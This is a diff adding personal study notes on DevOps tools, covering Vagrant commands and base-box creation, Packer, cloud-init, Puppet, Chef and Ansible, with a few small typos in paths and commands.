@@ -1,0 +1,2678 @@
+----------------------------------------------- MACHINE DEPLOYMENT -----------------------------------------------
+[VAGRANT]
+Vagrant is a tool for building and managing virtual machine environments.
+Machines are provisioned on top of a provider (VirtualBox, VMWare, AWS, Docker, etc).
+You can use provisioning tools such as shell scripts, Chef, or Puppet.
+Out of the box are 3 providers that are supported:
+    - VirtualBox.
+    - Hyper-V.
+    - Docker.
+However, you can use custom providers. But you need to ensure they are installed first before use them, and the plugin for that specific provider is installed.
+
+COMMAND vagrant init: Initializes the current directory to be a Vagrant environment by creating a Vagrantfile.
+COMMAND vagrant up: Creates and configures guest machines according to your Vagrantfile.
+COMMAND vagrant destroy: Stops the running and destroys all resources that were created.
+COMMAND vagrant validate: Validates your Vagrantfile.
+COMMAND vagrant provision: Runs any configured provisioners.
+COMMAND vagrant reload: Runs a halt followed by an up.
+COMMAND vagrant status: This will tell you the state of the machines.
+COMMAND vagrant ssh: SSH into a running Vagrant machine.
+
+
+[INSTALLING VAGRANT]
+You can install Vagrant in a variety of OS such as Windows, Linux (Debian, CentOs), MacOSX.
+To install Vagrant in CentOS you can execute command:
+    yum install -y https://releases.hashicorp.com/vagrant/2.2.9/vagrant_2.2.9_x86_64.rpm    # Installs the RPM package of Vagrant.
+You can get the installation packages for all the OSs in https://www.vagrantup.com/downloads
+
+You can verify installation by running:
+    vagrant --version   # Displays the Vagrant version.
+
+
+[VAGRANT COMMANDS]
+COMMAND vagrant init:
+Initializes the current directory to be a Vagrant environment by creating a Vagrantfile.
+Flags:
+    - -h: Display the help.
+    - -f: Overwrite existing Vagrantfile.
+    - -m: Generate a minimal Vagrant template (Vagrantfile with no help comments).
+    - --output FILE: Output path for the box.
+    - --template FILE: Path to custom Vagrantfile template.
+Structure:
+    vagrant init [OPTIONS] [BOXNAME]
+Example:
+    vagrant init    # Sets a Vagrant environment (Vagrantfile) in current dir.
+    vagrant init hashicorp/precise64    # Sets a Vagrant environment (Vagrantfile) in current dir with the box specified.
+
+COMMAND vagrant up:
+Creates and configures guest machines according to your Vagrantfile.
+Flags:
+    --[no-]provision: Enable or disable provisioning.
+    --provision-with x,y,z: Enable only certain provisioners, by type or by name.
+    --[no-]destroy-on-error: Destroy machine if any fatal error happens (default to true).
+    --[no-]parallel: Enable or disable parallelism if provider supports it.
+    --provider PROVIDER: Back the machine with a specific provider (usually not needed, since Vagrant will detect it automatically based on the Vagrantfile values).
+    --[no-]install-provider: If possible, install the provider if it isn't installed.
+Structure:
+    vagrant up [OPTIONS] [NAME|ID]
+Example:
+    vagrant up  # Configures the guest machines based on Vagrantfile.
+    vagrant up web  # Create only the web virtual machine specified in the Vagrantfile.
+
+COMMAND vagrant destroy:
+Stops the running and destroys all resources that were created.
+Flags:
+    - -f: Destroy without confirmation.
+Structure:
+    vagrant destroy [OPTIONS] [NAME|ID]
+Example:
+    vagrant destroy # Destroy all the guest machines.
+
+COMMAND vagrant validate:
+Validates your Vagrantfile.
+Structure:
+    vagrant validate
+Example:
+    vagrant validate    # Validates the syntax of the Vagrantfile in the current directory.
+
+COMMAND vagrant provision:
+Runs any configured provisioners against the running Vagrant managed machine.
+Flags:
+    - --provision-with x,y,z: Enable only certain provisioners, by type or by name.
+Structure:
+    vagrant provision [OPTIONS] [VM-NAME]
+Example:
+    vagrant provision --provision-with shell    # It will run guest machines using the provisioner shell.
+
+COMMAND vagrant reload:
+Runs a halt followed by an up.
+Flags:
+    - --[no-]provision: Enable or disable provisioning.
+    - --provision-with x,y,z: Enable only certain provisioners, by type or by name.
+Structure:
+    vagrant reload [NAME|ID]
+Example:
+    vagrant reload  # Restart all guests machines.
+
+COMMAND vagrant status:
+This will tell you the state of the machines.
+Structure:
+    vagrant status [NAME|ID]
+Example:
+    vagrant status  # Checks the status of the guest machines.
+
+COMMAND vagrant ssh:
+SSH into a running Vagrant machine.
+Flags:
+    - -c: Execute an SSH command directly.
+    - -p: Plain mode, leaves authentication up to the user.
+Structure:
+    vagrant ssh [OPTIONS] [NAME|ID] [EXTRA-SSH-OPTS]
+Example:
+    vagrant ssh -c 'ls /'   # Runs the ls command via ssh in the default guest machine.
+
+COMMAND vagrant halt:
+Flags:
+    -f: Force shut down (equivalent of pulling power).
+Structure:
+    vagrant halt [OPTIONS] [NAME|ID]
+Example:
+    vagrant halt            # Halt all the environment (all guest machines).
+    vagrant halt default    # Halt only the guest machine default.
+
+
+[VAGRANT FILES]
+A Vagrant file is a file that describes the types of machines that the environment requires and how to go through the process of configuring and provisioning them.
+You only have one file per project. It's recommended to keep these files under source control. This is Infrastructure as Code.
+The Vagrant file uses ruby syntax.
+The 'vagrant up' command will look for a Vagrantfile in the current directory, if it doesn't find any, it will look on the next parent directory, it will repeat this process until it finds a Vagrantfile or until it reaches the '/' directory.
+Vagrant is backwards compatible.
+When working with Docker, by default Vagrant will create a bind mount in the project directory.
+
+STRUCTURE OF THE Vagrantfile:
+Vagrant.configure("2"): Specifies which version of Vagrant it uses.
+
+The next is a code block and it modifies the configuration of Vagrant:
+do |config|
+    config.vm.box = "base"
+end
+
+config.vm.provider PROVIDER: Specify the provider to be used.
+d.image = "IMAGE": Specify the docker image to be used.
+
+EXAMPLE:
+Vagrant.configure("2") do |config|
+    config.vm.provider "docker" do |d|
+        d.image = "ghost"
+        d.ports = ["80:2368"]
+    end
+end
+
+
+[ACCESSING VAGRANT VMS]
+You can also access a virtual machine using the 'ssh' command, you will need to know the published port in the host machine to access it.
+    ssh myuser@localhost -p 2222 -i ~/.vagrant.d/insecure_private_key    # Access the virtual machine using ssh command.
+If you have multiple VMs, each of them will get a different host port for ssh connectivity.
+
+COMMAND vagrant ssh-config:
+This command will display the ssh information for a host.
+Structure:
+    vagrant ssh-config
+Example:
+    vagrant ssh-config  # Display the host ssh information.
+
+
+[DEFINING MULTIPLE MACHINES IN VAGRANT]
+You can define multiple virtual machines in a single Vagrantfile.
+
+
+[VAGRANT PROVISIONING]
+Provisioners in Vagrant allow you to automatically install software, alter configurations, and more on the machine as part of the 'vagrant up' process.
+There are several provisioners you can use such as:
+    - File. This enables you to go and use a file (Like a shell script).
+    - Shell. Allows you to execute shell commands. You can also specify a file.
+    - Chef.
+    - Ansible.
+    - Puppet.
+    - Salt.
+
+
+[VAGRANT BOXES]
+Vagrant boxes are the package format for Vagrant environments.
+They can be used on any platform that Vagrant supports. Versioning is also supported.
+You can download existing Vagrant boxes in https://app.vagrantup.com/boxes/search
+When you install a box file, vagrant unpackes the box and store the contents internally. You can recreate the box file from this internal data using the 'vagrant box repackage' command.
+
+COMMAND vagrant box add:
+Add a box to vagrant. You can add a local box or specify an url.
+Structure:
+    vagrant box add ADDRESS
+
+COMMAND vagrant box list:
+List all the boxes installed in your system. It will also display the box version.
+Structure:
+    vagrant box list
+
+COMMAND vagrant box outdated:
+It tells you whether or not a box is being used in your vagrant environment is out of date or not.
+Structure:
+    vagrant box outdated
+
+COMMAND vagrant box prune:
+Prone out old versions of boxes.
+Structure:
+    vagrant box prune
+
+COMMAND vagrant box remove:
+Remove a box.
+Structure:
+    vagrant box remove NAME
+
+COMMAND vagrant box repackage:
+This command reconstructs the box file based on the configured vagrant box in the system.
+Structure:
+    vagrant box repackage NAME PROVIDER VERSION
+
+COMMAND vagrant box update:
+This command updates an existing box (It will re-download the newest version of the box file).
+This command will not update the environment. If you want to use the new version of the box you would need to destroy the current environment and perform again 'vagrant up'.
+Structure:
+    vagrant box update
+
+BOX VERSIONING:
+Since Vagrant 1.5, boxes support versioning.
+You can update boxes with 'vagrant box update' command.
+    - This will download and install the new box.
+    - This will not magically update running Vagrant environments.
+
+You can constrain a Vagrant environment to a specific version.
+Constrains can be any combination of the following:
+    - = X.
+    - > X.
+    - < X.
+    - >= X.
+    - <= X.
+    - ~> X.
+    config.vm.box_version = X
+
+You can also configure Vagrant to automatically check for updates. By default it's set to 'false':
+    config.vm.box_check_update = true
+
+Vagrant does not automatically prune old versions.
+    vagrant box prune
+
+
+[CREATING A BASE BOX]
+You can create your own vagrant boxes in case existing ones don't cover your needs.
+You would need to create a virtual machine (you can perform this by creating it via VirtualBox).
+You can get the Insecure keys for your image in https://github.com/hashicorp/vagrant/tree/master/keys.
+These keys are the 'insecure' public/private keys offered by vagrant to base box creators for use in the base boxes so that vagrant installations can automatically SSH into the boxes.
+If you're working with a team or company or with a custom box and you want more secure SSH, you should create your own keypair and configure the private key in the Vagrantfile with 'config.ssh.private_key_path'.
+    - Create the user 'vagrant' in the new virtual machine and set its password to 'vagrant'.
+    - Make sure to have the SSH server installed in the new virtual machine.
+    - Set the root password to 'vagrant' too.
+    - Set (if no already set) the vagrant user to have elevated permissions and NOPASSWD to execute administration tasks.
+    - Create the ssh directory for the 'vagrant' user with the correct permissions.
+        mkdir /home/vagrant/.ssh
+        chmod 0700 /home/vagrant/.ssh
+    - Copy the public key for 'vagrant' user into the ssh directory with name 'authorized_keys' and correct permissions:
+        cd /home/vagrant/.ssh
+        wget https://raw.githubusercontent.com/hashicorp/vagrant/master/keys/vagrant.pub
+        mv vagrant.pub authorized_keys
+        chmod 0600 authorized_keys
+    - Make sure both the .ssh directory and its content are owned by the 'vagrant' user.
+        cd ~
+        chown -R vagrant:vagrant .ssh
+    - Configure the ssh service. Insert the line 'AuthorizedKeysFile %h/.ssh/authorized_keys'.
+    - Restart the ssh service.
+        service ssh restart
+    - Install the packages for Linux Headers.
+        apt-get install -y gcc build-essential git linux-headers-$(uname -r) dkms
+    - Install the virtualbox tools.
+        mount /dev/cdrom /mnt
+        cd /mnt
+        ./VBoxLinuxAdditions.run
+    - As a safety matter, run this command to avoid de-fragmentation issues.
+        dd if=/dev/zero of=/EMPTY bs=1M
+        rm -f /EMPTY
+    - Next step is to package the configured virtual machine into a vagrant box (box file). This will generate a 'package.box' file.
+        vagrant package --base VIRTUALMACHINENAME
+        vagrant package --base ubuntu64-base
+    - Import the box file into vagrant. As default, it will set the version to 0 (v0).
+        vagrant box add VAGRANTBOXNAME FILE
+        vagrant box add ubuntu64 package.box
+
+After this you can make use of the newly create vagrant box for set up an environment.
+    vagrant box list            # Lists the local boxes.
+    vagrant init ubuntu64 -m    # Creates the Vagrantfile.
+    vagrant up                  # Spins up the environment.
+    vagrant ssh                 # To verify we can access to the vagrant machine.
+
+
+[VAGRANT BOX COMMANDS]
+COMMAND vagrant box add:
+Add a box to vagrant. You can add a local box or specify an url.
+Flags:
+    - --name BOX: Name of the box.
+Structure:
+    vagrant box add ADDRESSORLOCATION
+Example:
+    vagrant box add --name ubuntu64 package.box     # Creates a box named ubuntu64 base on the file box package.box.
+
+COMMAND vagrant box list:
+List all the boxes installed in your system. It will also display the box version and provider.
+Flags:
+    - -i: Display additional information about the boxes.
+Structure:
+    vagrant box list
+Example:
+    vagrant box list    # Lists all the boxes installed in the system.
+
+COMMAND vagrant box outdated:
+It tells you whether or not a box is being used in your vagrant environment is out of date or not. By default it only shows information for the boxes in use.
+Flags:
+    - --global: Checks all boxes installed.
+Structure:
+    vagrant box outdated
+Example:
+    vagrant box outdated --global   # Display all the outdated boxes installed on the system.
+
+COMMAND vagrant box update:
+This command updates an existing box (It will re-download the newest version of the box file).
+This command will not update the environment. If you want to use the new version of the box you would need to destroy the current environment and perform again 'vagrant up'.
+Flags:
+    - --box BOX: Update a specific box.
+Structure:
+    vagrant box update
+Example:
+    vagrant update --box centos/7   # Updates the centos/7 box.
+
+COMMAND vagrant box prune:
+Prune out old versions of boxes.
+Flags:
+    - -n: Only print the boxes that would be removed.
+Structure:
+    vagrant box prune
+Example:
+    vagrant box prune -n    # It will display all the boxes that can be pruned.
+    vagrant box prune       # Prune the old-version boxes.
+
+COMMAND vagrant box repackage:
+This command reconstructs the box file based on the configured vagrant box in the system. It will generate a new file called 'package.box'.
+Structure:
+    vagrant box repackage NAME PROVIDER VERSION
+Example:
+    vagrant box repackage ubuntu64 virtualbox 0 # Repackages the box 'ubuntu64'.
+
+COMMAND vagrant box remove:
+Remove a box.
+Structure:
+    vagrant box remove NAME
+Example:
+    vagrant box remove ubunt64  # Removes the box ubuntu64.
+
+
+[BOX FILE FORMAT]
+Initially with early versions of vagrant, boxfiles were nothing more than virtualbox exports.
+Now with vagrant supporting multiple providers as well as the ability to go importing box files, these got more complex.
+Box files are just archives compressed via zip or tar.gz.
+    tar xzvf package.box    # Uncompress a box file.
+STRUCTURE:
+    - Vagrantfile.
+    - box-disk001.vmdk.
+    - box.ovf: The command 'vagrant box list -i' gets the information from this file. You can also have a info.json file as a substitute of this file.
+    - metadata.json: This is a JSON file containing the metadata such as:
+        * name.
+        * description.
+        * available versions.
+        * available providers.
+            "provider":"virtualbox"
+        * url to the actual box file.
+        If you don't have a metadata.json file for the box, you still can use it but you will lost the functionality of support versioning or updating.
+
+
+[PACKER]
+Packer is a tool for automating the creation of machine images.
+Packer is an open source tool for creating identical machine images for multiple platforms using a single configuration.
+It run on every major OS.
+It allows you to create machine images for multiple platforms in parallel using a single configuration file.
+Package doesn't replace configuration management. It works in parallel with it.
+A machine image is a single static unit that contains a pre-configured OS.
+You can download package from https://www.package.io/downloads.html
+
+PACKAGE TEMPLATES:
+Templates in Packer are JSON files.
+Template components:
+    - builders. Builder component is an array. Builders are used to specify what type of image will be creating (AMI AWS, Docker Image, etc).
+    - description. This is optional. String to provide a description.
+    - min_packer_version. This is optional. Minimal Packer Version you can use.
+    - post-processor. Actions executed once the build is completed (tagging or publishing a docker image).
+    - provisioners. This is an array. Specify how to configure the machine image. You can use a variety of configuration managers (Puppet, Chef, Ansible, shell scripts).
+    - variables. You can pass variables at runtime. Key-Value pairs.
+
+COMMAND packer build: Runs all the builds in order and generate a set of artifacts.
+COMMAND packer fix: Find backwards incompatible parts and brings them up to date. Changes will be send to STDOUT.
+COMMAND packer inspect: Reads a template and outputs the various components that the template defines.
+COMMAND packer validate: Validates the syntax and configuration of a template.
+
+BUILDERS:
+The builder is responsible for creating machines and generating images.
+Example of Builders are:
+    - Amazon AMI.
+    - Azure Resource Manager.
+    - Docker.
+    - HyperV.
+    - OpenStack.
+    - VirtualBox.
+    - VMWare.
+
+PROVISIONERS:
+They install and configure the machine image after booting.
+Example of Provisioners are:
+    - Ansible. You can use Ansible locally (needs to be installed in the guest machine), or Ansible remotely.
+    - Chef. You can use Chef solo (locally). You can also use it remotely.
+    - File. Uploads file to the machine being built by Packer. Recommended to add folder, files or archives to the machine being build.
+    - PowerShell.
+    - Puppet. You can use Puppet masterless (locally) or Puppet server.
+    - Shell. Shell commands (inline method) / scripts.
+
+POST-PROCESSORS:
+They run after the image is built by the builder and provisioned by the provisioner.
+Example of Post-Processors are:
+    - Amazon Import.
+    - Checksum. Creates a checksum artifact for machine image verification.
+    - Docker Push.
+    - Docker Tag.
+    - Google Compute Image Exporter.
+    - Shell. Either shell scripts or inline (commands).
+    - Vagrant. Allows you to create a Vagrant box file based on a supported builder (AWS DigitalOcean, Google, HyperV, QEMU, VirtualBox, VMWare).
+    - vSphere.
+
+
+[INSTALLING PACKER]
+Set the current directory to '/usr/local/bin' to place the binary file there.
+    cd /usr/bin/local/
+
+Download the packer zip file.
+    wget https://releases.hashicorp.com/packer/1.6.1/packer_1.6.1_linux_amd64.zip
+
+Install the package.
+    yum install unzip -y
+    unzip packer_1.6.1_linux_amd64.zip
+    rm packer_1.6.1_linux_amd64.zip # As optional, you can remove the zip file.
+
+Verify packer version.
+    packer --version
+
+
+[CREATING A PACKER TEMPLATE]
+You can create a packer template for building machine images.
+The file must be in json format.
+
+Then you can build the image with 'packer build' command.
+    packer build -var 'tag=0.0.1' packer.json  # Builds a package machine image.
+
+
+[CLOUD INIT]
+Cloud init is a multi-distribution package (Python scripts and utilities) that handles early initialization of a cloud instance.
+Use cases:
+    - Setting default locale.
+    - Setting an instance hostname.
+    - Generating instance SSH private keys.
+    - Adding SSH keys to user's .ssh/authorized_keys
+    - Setting up ephemeral mount points.
+    - Configuring network devices.
+
+COMMAND cloud-init init: Initializes cloud-init and performs initial modules. This command is generally run by the OS on the system.
+COMMAND cloud-init modules: Activates modules using a given configuration key. This command is generally run by the OS on the system.
+COMMAND cloud-init single --name MODULENAME: Runs a single module.
+COMMAND cloud-init dhclient-hook: Runs the dhclient hook to record network info.
+COMMAND cloud-init features: List defined features. This command is not always present.
+COMMAND cloud-init analyze: Analyzes cloud-init log and data.
+COMMAND cloud-init devel: Runs development tools.
+COMMAND cloud-init collect-logs: Collects and tar all cloud-init debug info.
+COMMAND cloud-init clean: Removes logs and artifacts so cloud-init can re-run.
+COMMAND cloud-init status: Reports cloud-init status or wait on completion.
+
+CLOUD INIT AVAILABILITY:
+The cloud init comes installed in the Ubuntu Cloud Images and images available on EC2, Azure, GCE, etc.
+Other OS:
+    - Fedora.
+    - Debian.
+    - RHEL.
+    - CentOS.
+
+CLOUD INIT FORMATS:
+There are two formats that Cloud Init works in.
+    - Gzip Compressed Content.
+    - Mime Multi Part Archive.
+        * text/x-include-once-url.
+        * text/x-include-url.
+        * text/cloud-config-archive.
+        * text/upstart-job.
+        * text/cloud-config.
+        * text/part-handler.
+        * text/x-shellscript.
+        * text/cloud-boothook.
+
+User-Data Script:
+Typically used by those who just want to execute a shell script.
+Begins with #! or Content-Type: text/x-shellscripts when using MIME archive.
+
+Include file:
+This content is an include file.
+Begins with #include or Content-Type:text/x-include-url when using MIME archive.
+
+Cloud Config Data:
+Cloud-config is the simplest way to accomplish some things via user-data.
+Using cloud-config syntax, the user can specify certain things in a human friendly format.
+Begins with #cloud-config or Content-Type:text/cloud-config when using a MIME archive.
+
+Upstart Job:
+Content is placed into a file in /etc/init, and it will be consumed by upstart as any other upstart job.
+It begins iwht #upstart-job or Content-Type:text/upstart-job when using a MIME archive.
+
+Cloud Boothook:
+This content is boothook data. It's stored in a file under /var/lib/cloud and then executed immediately.
+It begins with #cloud-boothook or Content-Type:text/cloud-boothook when using MIME archive.
+
+Part Handler:
+It contains custom code for either supporting new mime-types in multi-part user data, or overriding the existing handlers for supported mime-types.
+Begins with #part-handler or Content-Type:text/part-handler when using a MIME archive.
+
+EXAMPLE:
+#!/bin/sh
+echo "Hello world. The time is now $(data -R)!" | tee /root/output.txt
+
+
+
+----------------------------------------------- CONFIGURATION MANAGEMENT -----------------------------------------------
+[CONFIGURATION MANAGEMENT]
+Configuration management refers to the process of systematically handling changes to a system, maintaining integrity of a system over time.
+Configuration management resolves configuration drift. It helps on maintaining a desired state.
+Automation plays a key role in configuration management.
+
+Configuration management tools:
+    - Puppet.
+    - Ansible.
+    - Chef.
+    - Salt.
+
+IDEMPOTENT BEHAVIOUR:
+Idempotence is an operation that can be applied multiple times without changing the results beyond the initial application.
+Configuration management tools will avoid repeating tasks.
+The desired state is maintained even if you run it multiple times.
+This behavior is not necessary enforced in all cases.
+
+ADVANTAGES OF USING CONFIGURATION MANAGEMENT TOOLS:
+Quick provisioning of new servers.
+Quick recovery from critical events.
+No more snowflake servers.
+Version control for the server environment.
+Replicated environments.
+Infrastructure become disposable.
+
+OVERVIEW OF ANSIBLE / PUPPET / CHEF:
+                                        |   Ansible                                                 |   Puppet                                                  |   Chef
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Script Language                         | YAML                                                      | Custom DSL based on Ruby.                                 | Ruby
+Infrastructure                          | Controller machine applies configuration on nodes via SSH.| Puppet Master synchronizes configuration on Puppet nodes. | Chef Workstations push configuration to Chef Server, from which the Chef Nodes will be updated.
+Requires specialized software for nodes | No.                                                       | Yes.                                                      | Yes.
+Provides centralized point of control   | No. Any computer can be a controller.                     | Yes, via Puppet Master.                                   | Yes, via Chef Server.
+Script terminology                      | Playbook / Roles.                                         | Manifests / Modules.                                      | Recipes / Cookbooks.
+Task Execution Order                    | Sequential.                                               | Non-sequential                                            | Sequential.
+
+
+[PUPPET]
+Puppet is designed to manage the configuration of Unix-like and Microsoft Windows systems declaratively.
+It describes system resources and their state using the Puppet DSL. The Puppet DSL is based on Ruby.
+Resource types are used to manage system resources.
+    - Users.
+    - Groups.
+    - File.
+    - Package.
+    - Service.
+Resource types are declared in manifest files. Manifest files can be used within a Module.
+You can either run Puppet locally, or in a Master-Slave setup.
+
+RESOURCE TYPE FORMAT:
+TYPE{'TITLE':
+    ATTRIBUTE => VALUE,
+}
+Example:
+user{'myuser':
+    ensure => present,
+    uid => '102',
+    gid => 'wheel',
+    shell => '/bin/bash',
+    home => '/home/myuser',
+    managehome => true,
+}
+
+COMMAND puppet apply: Manages systems without needing to contact a Puppet master server.
+COMMAND puppet agent: Manages systems, with the help of a Puppet master.
+COMMAND puppet cert: Helps manage Puppet's built-in certificate authority (CA).
+COMMAND puppet module: It's a multi-purpose tool for working with Puppet modules.
+COMMAND puppet resource: It lets you interactively inspect and manipulate resources on a system.
+COMMAND puppet parser: Lets you validate Puppet code to make sure it contains no syntax errors.
+
+
+[CHEF]
+Chef is both the name of a company, and the name of a configuration management tool written in Ruby. It uses a pure Ruby DSL.
+Use Chef Development Kit (Chef DK) to get the tools to test your code.
+Chef uses a client-server model.
+It utilizes a declarative approach to configuration management. Resources are idempotent.
+Chef uses resources to describe your infrastructure.
+A Chef recipe is a file that groups related resources.
+Chef cookbook provides structure to your recipes.
+You use the knife command for interacting with the Chef server.
+
+CHEF TESTING TOOLS:
+Cookstyle:
+It's a code linting tool that helps you write better Chef Infra cookbooks by detecting and automatically correcting style, syntax, and logic mistakes in your code.
+
+Foodcritic:
+Foodcritic is a Ruby command-line tool to perform lint checking against Chef cookbooks.
+Cookbook authors use Foodcritic to help enforce good patterns and create higher quality cookbooks.
+
+ChefSpec:
+ChefSpec is a unit testing framework for Chef cookbooks. It runs tests locally without making changes to the system.
+
+InSpec:
+It's an open-source testing framework for infrastructure with a human- and machine-readable language for specifying compliance, security and policy requirements.
+
+Test Kitchen:
+Test Kitchen is an integration tool for developing and testing infrastructure code and software on isolated target platforms.
+It creates test machines, converges them, and runs post-convergence tests against them to verify their state.
+It has a plugin system for supporting machine creation through a variety of virtual machine technologies such as vagrant, EC2, docker, and several others.
+
+CHEF-CLIENT:
+A 'chef-client' is an agent that runs nodes managed by Chef.
+The agent will bring the node into the expected state:
+    - Registering and authenticating the node with the Chef server.
+    - Building the node object.
+    - synchronizing cookbooks.
+    - Taking the appropriate and required actions to configure the node.
+    - Looking for exceptions and notifications.
+
+COMMAND chef-server-ctl:
+The Chef server comes with this utility.
+It start and stop individual services.
+Reconfigure the Chef server.
+Gather Chef server log files.
+Backup and restore Chef server data.
+
+COMMAND chef-server-ctl restore:
+This command restores a Chef server data from a backup.
+Structure:
+    chef-server-ctl restore PATHTOBACKUP [OPTIONS]
+
+COMMAND chef-server-ctl backup-recover:
+This command forces the chef server to attempt to become the backup server.
+
+COMMAND chef-server-ctl cleanse:
+This command reset the chef server to a state that it was prior to when the reconfigure was run.
+
+COMMAND chef-server-ctl gather-logs:
+It gather logs from he chef server. This creates an archive file with all important log files.
+
+COMMAND chef-server-ctl ha-status:
+Used to check to see if the Chef servers are running in HA.
+
+COMMAND chef-server-ctl show-config:
+Display the current configuration.
+
+COMMAND chef-server-ctl start:
+Used to start a service on the Chef server.
+Structure:
+    chef-server-ctl start SERVICENAME
+
+COMMAND chef-server-ctl restart:
+Used to restart all the services that are enabled on the Chef server.
+Structure:
+    chef-server-ctl restart SERVICENAME
+
+COMMAND chef-server-ctl stop:
+Used to stop a service on the Chef server.
+Structure:
+    chef-server-ctl stop SERVICENAME
+
+COMMAND chef-server-ctl service-list:
+List all the available services on the Chef server.
+
+COMMAND chef-server-ctl status:
+Display the status of all the services available on the Chef server.
+
+CHEF-SOLO:
+'chef-solo' is a command that executes chef-client to converge cookbooks in a way that doesn't require the Chef server.
+It uses chef-client's chef local mode.
+It doesn't support:
+    - Centralized distribution of cookbooks.
+    - A centralized API that interacts with and integrates infrastructure components.
+    - Authentication or authorization.
+chef-solo supports 2 locations from which cookbook can be run:
+    - A local directory.
+    - A URL at which a tar.gz archive is located.
+
+COOKBOOKS:
+A Cookbook is the fundamental unit of configuration and policy distribution. A cookbook defines an scenario and contains everything that is required to support that scenario.
+It contains:
+     - Recipes that specify the resources to use and the order in which they are to be applied.
+     - Attribute values.
+     - File distributions.
+     - Templates.
+     - Extensions to Chef, such as custom resources and libraries.
+
+COMMAND knife:
+'knife' is a command-line tool that provides an interface between a local chef-repo and the Chef server. knife helps users to manage:
+    - Nodes
+    - Cookbooks and recipes
+    - Roles
+    - Stores of JSON data (data bags), including encrypted data
+    - Environments
+    - Cloud resources, including provisioning
+    - The installation of the chef-client on management workstations
+    - Searching of indexed data on the Chef server
+
+COMMAND knife cookbook:
+Interact with cookbooks locally in the Chef server or in a local Chef.
+
+COMMAND knife cookbook generate:
+Generate a cookbook.
+Structure:
+    knife cookbook generate COOKBOOKNAME [OPTIONS]
+
+COMMAND knife cookbook delete:
+Delete a cookbook from the Chef server.
+Structure:
+    knife cookbook delete COOKBOOKNAME [COOKBOOKVERSION] [OPTIONS]
+
+COMMAND knife cookbook download:
+Download a cookbook from the Chef server. It place the cookbook in the current directory.
+Structure:
+    knife cookbook download COOKBOOKNAME [COOKBOOKVERSION] [OPTIONS]
+
+COMMAND knife cookbook list:
+List all available cookbooks in the Chef server.
+Structure:
+    knife cookbook list [OPTIONS]
+
+COMMAND knife cookbook metadata:
+Generate metadata for one or more cookbooks.
+Structure:
+    knife cookbook metadata [OPTIONS]
+
+COMMAND knife cookbook show:
+Used to gather information about an specific cookbook.
+Structure:
+    knife cookbook show COOKBOOKNAME
+
+COMMAND knife cookbook upload:
+Used to upload one or more cookbooks to the Chef server. Only files not existing in the Chef servers are going to be uploaded.
+Structure:
+    knife cookbook upload [COOKBOOKNAME...] [OPTIONS]
+
+[ANSIBLE]
+Ansible is an open source software that automates software provisioning, configuration management, and application deployment.
+Ansible is agentless since it works over SSH.
+Ansible uses playbooks for configuration deployment and orchestration. Playbooks are expressed using YAML.
+
+COMMAND ansible:
+Define and run a single task against a set of hosts.
+Structure:
+    ansible HOSTPATTERN [OPTIONS]
+
+COMMAND ansible-config:
+View, edit, and manage Ansible configuration.
+Structure:
+    ansible-config [OPTIONS] [ansible.cfg]
+
+COMMAND ansible-console:
+Executes a REPL (Real-time Eval Print Loop. A shell) console for executing Ansible tasks.
+Structure:
+    ansible-console [HOSTPATTERN] [OPTIONS]
+
+COMMAND ansible-doc:
+Plugin documentation tool.
+Structure:
+    ansible-doc [OPTIONS] [PLUGIN]
+
+COMMAND ansible-galaxy:
+This command manages Ansible roles in shared repositories. The default one is Ansible Galaxy: https://galaxy.ansible.com.
+Structure:
+    ansible-galaxy [OPTIONS]
+
+COMMAND ansible-inventory:
+Used to display or dump the configured inventory as Ansible sees it.
+Structure:
+    ansible-inventory [OPTIONS] [HOST|GROUP]
+
+COMMAND ansible-playbook:
+Runs Ansible playbooks, executing he defined tasks on the targered hosts.
+Structure:
+    ansible-playbook [OPTIONS] PLAYBOOK.YAML...
+
+COMMAND ansible-pull:
+Pulls playbooks from a VCS repo and executes them from the local host.
+Structure:
+    ansible-pull -U REPOSITORY [OPTIONS] [PLAYBOOK]
+
+COMMAND ansible-vault:
+Encryption/decryption utility for Ansible data files.
+Structure:
+    ansible-vault [OPTIONS] [VAULTFILE]
+
+ANSIBLE INVENTORY:
+By default, Ansible manage the inventory under '/etc/ansible/hosts'.
+You can specify a different inventory files by using the '-i FILE' flag at command line.
+
+Inventory structure in INI format:
+    mail.example.com
+
+    [webservers]
+    foo.example.com
+    bar.example.com
+
+    [dbservers]
+    one.example.com
+    two.example.com
+
+Inventory structure in YAML format:
+    all:
+        hosts:
+            mail.example.com
+    children:
+        webservers:
+            hosts:
+                foo.example.com
+                bar.example.com
+        dbservers:
+            hosts:
+                one.example.com
+                two.example.com
+
+ANSIBLE CONFIGURATION FILE:
+Configuration changes can be made and used in a configuration file which will be searched for in the following order:
+    - ANSIBLE_CONFIG (environment variable if set).
+    - ansible.cfg (in the current directory).
+    - ~/.ansible.cfg (in the home directory).
+    - /etc/ansible/ansible.cfg.
+
+
+[ANSIBLE VAULT]
+Ansible vault stores sensitive data such as password or keys in encrypted files. You can distribute those vault files or place them in source control.
+Ansible vault can encrypt any structured data file used by Ansible:
+    - group_vars/
+    - host_vars
+    - inventory variables.
+    - variables loaded by include_vars or var_files.
+    - -e \@file.yml or -e \@file.json when using ansible-playbook.
+
+The ansible-vault CLI tool is used to edit files.
+You have some flags in the 'ansible-playbook' command to work with Ansible Vault.
+    - --ask-vault-pass: Ask for vault password.
+    - --vault-password-file: Vault password file.
+
+COMMAND ansible-vault create:
+Create encrypted files.
+Example:
+    ansible-vault create foo.yml    # Creates an encrypted file.
+
+COMMAND ansible-vault encrypt:
+Encrypt unencrypted files.
+Encryption is permanent.
+Example:
+    ansible-vault encrypt foo.yml bar.yml   # Encrypts the files.
+
+COMMAND ansible-vault decrypt:
+Decrypt encrypted files.
+Decryption is permanent.
+Example:
+    ansible-vault decrypt foo.yml bar.yml   # Decrypts the encrypted files.
+
+COMMAND ansible-vault edit:
+Edit encrypted files.
+Example:
+    ansible-vault edit foo.yml  # Edit the encrypted file.
+
+COMMAND ansible-vault rekey:
+Rekey (reset passphrase) encrypted files.
+Example:
+    ansible-vault rekey foo.yml bar.yml # Resets the passphrase in encrypted files.
+
+COMMAND ansible-vault view:
+View encrpyted files.
+Example:
+    ansible-vault view foo.yml  # Display the content of the encrypted file.
+
+COMMAND ansible-vault encrypt_string:
+Create encrypted variables to embed in yaml files.
+Example:
+    ansible-vault encrypt_string --vault-id PASSWORDFILE 'CONTENTOFSTRING' --name 'NAMEOFSTRING'    # Encrypts a string using the PASSWORDFILE.
+
+
+
+----------------------------------------------- CONTAINER MANAGEMENT -----------------------------------------------
+[DOCKER]
